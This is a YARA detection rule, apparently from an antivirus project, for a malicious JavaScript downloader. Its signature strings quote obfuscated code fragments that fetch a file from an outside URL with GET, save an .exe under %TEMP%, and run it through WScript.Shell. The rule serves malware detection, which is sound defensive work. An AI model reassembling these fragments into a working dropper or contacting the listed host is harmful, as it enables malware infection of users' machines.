rule sig_20160328_80e92ed34e93be366cb16c5d3d100057 {
  meta:
    description = "datamaliciousorder - file 20160328_80e92ed34e93be366cb16c5d3d100057.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ebc6fdcec8ced7f4741d88f75d5c86f55e82212b06c64f1fd31daf156da350eb"

  strings:
    $s1  = "function Adychu() {return Xuvbplf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9OGG4TXJaldl8.exe\";};" fullword ascii
    $s2  = "do {WScript[Bimksoebk](Gkjigr() * 11)} while (Salkbk[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Reoijk(Xgocqx, Juaexoyh){return Xgocqx - Juaexoyh;};" fullword ascii
    $s4  = "var Xuvbplf = function Xpndbgkzd() {return WScript[Xwfvuohdk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Salkbk[Qwfabpovfv](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s6  = "function Snoegfeo() {return ((Gybqadqctf == true) && (Gybqadqctf == Zivjnby)) ? 1 : Nweslrqpr;};" fullword ascii
    $s7  = "function Wotwfchq(Dgzwjttgg){Xuvbplf[\"Run\"](Dgzwjttgg, Nweslrqpr, Nweslrqpr);};" fullword ascii
    $s8  = "return Reoijk(Cxunrg, Jivpq);" fullword ascii
    $s9  = "Gybqadqctf = true; " fullword ascii
    $s10 = "var Zzyfzuklh = false;" fullword ascii
    $s11 = "var Zivjnby = false;" fullword ascii
    $s12 = "var Gybqadqctf = false;" fullword ascii
    $s13 = " while (Gxrbcgnme){" fullword ascii
    $s14 = "function Wznouxf(Izouhwq) {var Dxmsaixxq = (1, 2, 3, 4, 5, Izouhwq); return Dxmsaixxq;};" fullword ascii
    $s15 = "function Hkfscirpre(){return Nwikdqidj;};" fullword ascii
    $s16 = "var Sgjik = new this[\"Date\"]();" fullword ascii
    $s17 = "function Gkjigr(){return 22;};" fullword ascii
    $s18 = "function Zyakawluhj(){return Xwfvuohdk;};" fullword ascii
    $s19 = "function Uqiupjk()" fullword ascii
    $s20 = "Zivjnby = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}